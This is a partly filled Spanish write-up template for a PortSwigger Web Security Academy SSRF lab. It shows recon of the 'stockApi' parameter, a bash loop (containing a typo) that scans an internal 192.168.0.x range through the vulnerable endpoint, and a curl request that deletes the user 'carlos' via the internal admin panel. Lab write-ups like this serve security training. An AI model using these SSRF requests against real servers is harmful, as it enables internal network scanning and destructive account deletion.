

# Nombre del Lab: [Nombre aquí]

**Tema:** [Ej: SSRF contra backend]

**Dificultad:** [Baja]

**Herramientas:** [ curl]

---

### 1. Reconocimiento

Se realiza un análisis inicial para identificar puntos de entrada y el comportamiento de la aplicación.

* **Comando:** `curl -v {ip}`
* **Observación:** [se detecto que la web realiza una peticion en la zona de opciones a una ip interna].
```<form id="stockCheckForm" action="/product/stock" method="POST">
    <select name="stockApi">
        <option value="http://192.168.0.1:8080/product/stock/check?productId=3&storeId=1">London</option>
    </select>
</form>```

### 2. Identificación de la Vulnerabilidad

Descripción del fallo encontrado y por qué ocurre.

* **Punto de inyección:** [ Parámetro `stockApi` en `/product/stock`]
* **Tipo de vulnerabilidad:** [SSRF mediante manipulación de URL en el backend]

### 3. Explotación

Pasos realizados para confirmar y explotar la vulnerabilidad.

1. **Construcción del payload:** [Se realiza una redireccion a la ip interna buscando el panel de 
administracion buscando en el rango de ip
]
2. **Ejecución:**
```bash
or i in {1..255}; do
  echo "Probando IP: 192.168.0.$i"
  curl -s -X POST "https://0a81004b0424315a8103c55700a80001.web-security-academy.net/product/stock" \
  -d "stockApi=http://192.168.0.$i:8080/admin" | grep -q "admin" && echo "¡ENCONTRADA!: 192.168.0.$i" && break
done



```



### 4. Resultado / Prueba de Concepto (PoC)

* **Acción final:** [Eliminación del usuario `carlos` / Acceso a archivos internos]
dep3ndiendo de la ip que se haya encontrado se lanzaria el aiguiente comando con curl
```bash
curl -X POST "https://0a81004b0424315a8103c55700a80001.web-security-academy.net/product/stock" -d "stockApi=http://192.168.0.83:8080/admin/delete?username=carlos"
```

* **Estado:** Resuelto / Explotado.


